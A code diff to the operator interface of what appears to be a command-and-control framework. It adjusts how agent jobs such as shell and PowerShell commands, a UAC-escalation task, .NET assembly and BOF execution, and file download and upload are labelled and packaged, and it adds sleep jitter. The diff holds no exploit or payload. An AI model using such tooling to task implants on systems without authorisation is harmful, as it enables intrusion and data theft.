@@ -107,7 +107,7 @@ public partial class Clients
     // which input boxes each job shows (null = hidden)
     private static (string?, string?, string?) JobLabels(string job) => job switch
     {
-        "Set Sleep"       => ("Sleep (ms)", null, null),
+        "Set Sleep"       => ("Sleep (ms)", "Jitter (%)", null),
         "Shell Command"   => ("Command", null, null),
         "PowerShell"      => ("Cmdlet", "Arguments", null),
         "Run"             => ("Program", "Arguments", null),
@@ -115,8 +115,8 @@ public partial class Clients
         "Run U"           => ("PID", "Command", "Arguments"),
         "Kill Process"    => ("PID", null, null),
         "Escalate (UAC)"  => ("Registry key", "Target binary", null),
-        ".NET Assembly"   => ("Assembly (base64 or path)", "Arguments", null),
-        "BOF"             => ("BOF (base64)", "Entrypoint", "Arguments"),
+        ".NET Assembly"   => ("Assembly path", "Arguments", null),
+        "BOF"             => ("BOF path", "Entrypoint", "Arguments"),
         "File Download"   => ("Remote path", null, null),
         "Cancel Download" => ("Task ID", null, null),
         "Upload"          => ("Path", null, null),
@@ -362,7 +362,7 @@ public partial class Clients
         {
             "Get UID"         => new { },
             "Kill Agent"      => new { },
-            "Set Sleep"       => new { Sleep = ParseInt(_jobArg, 5000) },
+            "Set Sleep"       => new { Sleep = ParseInt(_jobArg, 5000), Jitter = ParseInt(_jobArg2, 10) },
             "Shell Command"   => new { Command = _jobArg },
             "PowerShell"      => new { Commandlet = _jobArg, Arguements = _jobArg2 },
             "Run"             => new { Program = _jobArg, Arguements = _jobArg2 },
@@ -370,8 +370,8 @@ public partial class Clients
             "Run U"           => new { PID = ParseInt(_jobArg), Command = _jobArg2, Arguements = _jobArg3 },
             "Kill Process"    => new { PID = ParseInt(_jobArg) },
             "Escalate (UAC)"  => new { RegKey = _jobArg, TargetBinary = _jobArg2 },
-            ".NET Assembly"   => new { Assembly = _jobArg, Arguments = _jobArg2 },
-            "BOF"             => new { Bof = _jobArg, Entrypoint = _jobArg2, Arguements = _jobArg3 },
+            ".NET Assembly"   => new { AssemblyPath = _jobArg, Arguments = _jobArg2 },
+            "BOF"             => new { BofPath = _jobArg, Entrypoint = _jobArg2, Arguements = _jobArg3 },
             "File Download"   => new { Path = _jobArg },
             "Cancel Download" => new { TaskID = _jobArg },
             "Upload"          => new { Path = _jobArg },
